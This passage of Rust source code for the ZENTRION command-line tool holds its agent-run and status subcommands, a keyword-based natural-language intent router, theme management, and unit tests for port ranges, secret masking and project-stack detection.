                    } else {
                        "denied"
                    },
                    decision.reason
                );
            }
            Ok(())
        }
        "run" => {
            let goal = args[1..].join(" ");
            if goal.trim().is_empty() {
                return Err(ZenError::new(Area::Cfg, 87, "usage: z agent run <goal>"));
            }
            let runtime = tokio::runtime::Runtime::new().map_err(|e| {
                ZenError::new(Area::Cor, 88, format!("cannot start async runtime: {e}"))
            })?;
            let profile = agents::AgentProfile::security_lab_planner();
            let trace = runtime
                .block_on(agents::run_autonomous_with_profile(&goal, profile))
                .map_err(|e| {
                    ZenError::new(Area::Ai, 89, format!("agent run failed: {e}"))
                        .with_remediation(
                            "Configure ZENTRION_AI_PROVIDER/ZENTRION_AI_MODEL and ensure the provider is reachable.",
                        )
                })?;
            if json_out {
                println!("{}", serde_json::to_string_pretty(&trace)?);
            } else {
                println!("Agent trace for: {goal}");
                for event in &trace.events {
                    println!(
                        "  {:>2}. [{:?}] {} — {}",
                        event.step, event.role, event.event, event.detail
                    );
                }
            }
            Ok(())
        }
        "status" => {
            let provider =
                std::env::var("ZENTRION_AI_PROVIDER").unwrap_or_else(|_| "ollama".into());
            let model = std::env::var("ZENTRION_AI_MODEL").unwrap_or_else(|_| "default".into());
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({
                        "provider": provider,
                        "model": model,
                        "profiles": ["security-lab-planner"],
                        "guardrails": "allowlist + explicit approval",
                    }))?
                );
            } else {
                println!("ZENTRION agents");
                println!("  provider:   {provider}");
                println!("  model:      {model}");
                println!("  profiles:   security-lab-planner");
                println!("  guardrails: allowlist + explicit approval");
            }
            Ok(())
        }
        other => Err(
            ZenError::new(Area::Cfg, 90, format!("unknown agent subcommand `{other}`"))
                .with_remediation("Usage: z agent [status|profiles|guardrail|run]"),
        ),
    }
}

// ---------------------------------------------------------------------------
// natural-language intent router
// ---------------------------------------------------------------------------

pub fn do_intent(intent: &[String], project: Option<PathBuf>, json_out: bool) -> ZenResult<()> {
    let json_out = json_out || intent.iter().any(|arg| arg == "--json");
    let words: Vec<String> = intent
        .iter()
        .filter(|arg| arg.as_str() != "--json")
        .cloned()
        .collect();
    let text = words.join(" ");
    let lower = text.to_ascii_lowercase();
    if text.trim().is_empty() {
        return Err(
            ZenError::new(Area::Cfg, 91, "usage: z do <what you want to do>").with_remediation(
                "Examples: z do secure my project, z do status, z do install nmap",
            ),
        );
    }

    if lower.contains("secure") || lower.contains("scan") || lower.contains("audit") {
        if !json_out {
            println!("Intent: security review of the current directory");
        }
        return security(&["scan".to_string(), ".".to_string()], project, json_out);
    }
    if lower.contains("status") || lower.contains("health") || lower.contains("doctor") {
        if !json_out {
            println!("Intent: runtime status");
        }
        return commands::status(json_out, project);
    }
    if lower.contains("test") {
        if !json_out {
            println!("Intent: run the project test suite");
        }
        return code(&["test".to_string()], project, json_out);
    }
    if lower.contains("build") || lower.contains("compile") {
        if !json_out {
            println!("Intent: build the project");
        }
        return code(&["build".to_string()], project, json_out);
    }
    if lower.contains("docs") || lower.contains("help") || lower.contains("learn") {
        if !json_out {
            println!("Intent: open documentation");
        }
        return docs_cmd::docs(&[], json_out);
    }
    if lower.contains("theme") {
        let name = text
            .split_whitespace()
            .find(|word| ThemeCatalog::is_theme(word))
            .unwrap_or("zentrion");
        if !json_out {
            println!("Intent: switch theme to {name}");
        }
        return theme(&["set".to_string(), name.to_string()], json_out);
    }
    if lower.contains("install") {
        let tool = text
            .split_whitespace()
            .rev()
            .find(|word| !matches!(*word, "install" | "tool" | "the" | "a" | "an"))
            .unwrap_or("");
        if tool.is_empty() {
            return Err(ZenError::new(
                Area::Cfg,
                92,
                "what should I install? e.g. z do install nmap",
            ));
        }
        if !json_out {
            println!("Intent: install {tool} (verified, reviewed)");
        }
        return tools_cmd::install_tool(tool, None, false, false, false, json_out, project);
    }
    if lower.contains("bundle") || lower.contains("tools") {
        if !json_out {
            println!("Intent: list curated tool bundles");
        }
        return tools_cmd::bundle_cmd(&["list".to_string()], json_out, project);
    }
    if lower.contains("chat") || lower.contains("lan") {
        println!("Secure LAN chat lives in the terminal UI:");
        println!("  z ui    then press F6");
        println!("Or set ZENTRION_P2P_KEY and start two instances.");
        return Ok(());
    }
    if lower.contains("ai") || lower.contains("explain") || lower.contains("research") {
        let prompt = text
            .split_once(char::is_whitespace)
            .map(|(_, rest)| rest.to_string())
            .unwrap_or_else(|| text.clone());
        if !json_out {
            println!("Intent: ask the configured AI provider");
        }
        return phase3_cmd::ai(&["ask".to_string(), prompt], json_out);
    }

    Err(ZenError::new(
        Area::Cfg,
        93,
        format!("I could not map `{text}` to a safe action"),
    )
    .with_remediation(
        "Try: z do secure my project · z do status · z do test · z do build · z do install nmap · z do docs · z do theme dracula",
    ))
}

// ---------------------------------------------------------------------------
// themes
// ---------------------------------------------------------------------------

struct ThemeCatalog;

impl ThemeCatalog {
    fn names() -> &'static [&'static str] {
        tui::Theme::available()
    }
    fn is_theme(value: &str) -> bool {
        Self::names()
            .iter()
            .any(|name| name.eq_ignore_ascii_case(value))
    }
}

pub fn theme(args: &[String], json_out: bool) -> ZenResult<()> {
    let action = args.first().map(|s| s.as_str()).unwrap_or("show");
    match action {
        "list" => {
            let active = tui::Theme::load().name;
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({
                        "themes": ThemeCatalog::names(),
                        "active": active,
                    }))?
                );
            } else {
                println!("Themes");
                for name in ThemeCatalog::names() {
                    println!(
                        "  {}{}",
                        name,
                        if *name == active { "  (active)" } else { "" }
                    );
                }
                println!();
                println!("  z theme set <name>");
            }
            Ok(())
        }
        "show" => {
            let theme = tui::Theme::load();
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({
                        "name": theme.name,
                        "available": ThemeCatalog::names(),
                    }))?
                );
            } else {
                println!("Active theme: {}", theme.name);
                println!("Available:    {}", ThemeCatalog::names().join(", "));
            }
            Ok(())
        }
        "set" | "apply" => {
            let name = args.get(1).map(|s| s.as_str()).unwrap_or("");
            if name.is_empty() {
                return Err(ZenError::new(Area::Cfg, 94, "usage: z theme set <name>"));
            }
            if !ThemeCatalog::is_theme(name) {
                return Err(
                    ZenError::new(Area::Cfg, 95, format!("unknown theme `{name}`"))
                        .with_remediation(format!(
                            "Available: {}",
                            ThemeCatalog::names().join(", ")
                        )),
                );
            }
            tui::Theme::persist(name).map_err(|e| {
                ZenError::new(Area::Cfg, 96, format!("cannot save theme: {e}"))
                    .with_remediation("Ensure the config directory is writable.")
            })?;
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({"theme": name, "saved": true}))?
                );
            } else {
                println!("Theme set to {name}. Restart `z ui` to apply.");
            }
            Ok(())
        }
        "reset" => {
            let name = "zentrion";
            tui::Theme::persist(name)
                .map_err(|e| ZenError::new(Area::Cfg, 97, format!("cannot reset theme: {e}")))?;
            println!("Theme reset to {name}.");
            Ok(())
        }
        other => Err(
            ZenError::new(Area::Cfg, 98, format!("unknown theme subcommand `{other}`"))
                .with_remediation("Usage: z theme [list|show|set <name>|reset]"),
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn port_ranges_are_bounded() {
        assert_eq!(parse_range("80").unwrap(), vec![80]);
        assert_eq!(parse_range("80-82").unwrap(), vec![80, 81, 82]);
        assert!(parse_range("0-10").is_err());
        assert!(parse_range("90-80").is_err());
        assert!(parse_range("1-9000").is_err());
    }

    #[test]
    fn masks_short_and_long_secrets() {
        assert_eq!(mask("short"), "********");
        let key = concat!("AKIA", "7QZ2", "M4X9", "PLK3", "RT8V");
        assert_eq!(mask(key), "AKIA…RT8V");
    }

    #[test]
    fn detects_common_stacks() {
        let dir = std::env::temp_dir().join(format!("zentrion-stack-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        std::fs::write(dir.join("Cargo.toml"), "[package]\nname=\"x\"").unwrap();
        assert_eq!(detect_stack(&dir), vec![Stack::Cargo]);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
